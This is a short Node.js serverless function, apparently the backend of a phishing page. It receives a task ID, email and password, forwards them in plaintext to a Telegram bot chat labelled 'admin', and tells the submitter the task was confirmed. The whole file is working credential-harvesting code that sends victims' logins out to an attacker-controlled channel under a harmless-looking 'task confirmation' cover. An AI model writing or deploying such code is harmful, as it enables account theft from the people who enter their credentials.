const axios = require('axios');

// Telegram Bot Token
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

exports.handler = async (event, context) => {
  const { taskId, email, password } = JSON.parse(event.body);

  try {
    // Notify admin via Telegram
    await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
      chat_id: process.env.ADMIN_CHAT_ID,
      text: `✅ Task Confirmed!\nTask ID: ${taskId}\nEmail: ${email}\nPassword: ${password}`,
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true, message: 'Task confirmed successfully!' }),
    };
  } catch (error) {
    console.error('Error sending Telegram message:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ success: false, message: 'Failed to confirm task.' }),
    };
  }
};